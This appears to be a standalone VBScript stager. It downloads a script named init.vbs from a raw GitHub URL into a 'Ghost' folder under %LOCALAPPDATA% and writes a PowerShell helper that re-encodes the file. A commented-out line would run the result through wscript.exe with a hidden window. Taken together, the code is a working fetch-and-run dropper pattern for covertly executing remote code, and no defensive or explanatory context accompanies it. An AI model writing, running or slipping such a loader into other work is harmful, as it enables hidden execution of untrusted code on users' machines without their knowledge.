Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

ghostDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Ghost"
initPath = ghostDir & "\init.vbs"
psPath = ghostDir & "\convert.ps1"
url = "https://raw.githubusercontent.com/dakj0326/ghost/main/init.vbs"

' --- Step 1: Download init.vbs ---
Set x = CreateObject("MSXML2.XMLHTTP")
x.Open "GET", url, False
x.Send

If x.Status = 200 Then
    If Not fso.FolderExists(ghostDir) Then fso.CreateFolder(ghostDir)

    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "utf-8"
    stream.Open
    stream.WriteText x.ResponseText
    stream.SaveToFile initPath, 2
    stream.Close
End If

Set psFile = fso.CreateTextFile(psPath, True, False)  ' False = ASCII (no BOM)

psFile.WriteLine "$src  = ""$env:LOCALAPPDATA\Ghost\init.vbs"""
psFile.WriteLine "$dest = ""$env:LOCALAPPDATA\Ghost\cleaned_init.vbs"""
psFile.WriteLine ""
psFile.WriteLine "$content = Get-Content -Raw -Encoding UTF8 $src"
psFile.WriteLine "$content = $content -replace ""`n"", ""`r`n"""
psFile.WriteLine "$utf8NoBom = New-Object System.Text.UTF8Encoding $False"
psFile.WriteLine "[System.IO.File]::WriteAllText($dest, $content, $utf8NoBom)"
psFile.WriteLine ""
psFile.WriteLine "# Optional: Run cleaned script"
'psFile.WriteLine "Start-Process -WindowStyle Hidden -FilePath ""wscript.exe"" -ArgumentList ""`""$dest`"""""

psFile.Close